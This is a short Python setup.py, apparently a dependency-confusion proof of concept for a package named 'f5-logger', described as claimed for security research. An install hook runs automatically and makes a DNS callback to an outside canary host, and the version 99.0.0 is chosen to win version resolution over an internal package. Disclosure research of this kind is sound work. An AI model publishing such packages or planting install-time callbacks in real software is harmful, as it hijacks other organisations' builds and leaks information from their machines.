# Package Claimed for Security Research Purposes - H1 Logue
from setuptools import setup, find_packages
from setuptools.command.install import install
import socket
import os

class PostInstallCommand(install):
    def run(self):
        # DNS callback - safe, non-destructive proof
        try:
            hostname = f"f5-logger-poc.qnh4fh5qoj4e31l2dmc2mfo00r6iu9iy.b.nf"
            socket.gethostbyname(hostname)
        except:
            pass
        install.run(self)

setup(
    name='f5-logger',
    version='99.0.0',  # High version to win version resolution
    description='F5 Security Research Placeholder',
    author='Adam Logue',
    cmdclass={'install': PostInstallCommand},
    packages=find_packages(),
    python_requires='>=3.6',
)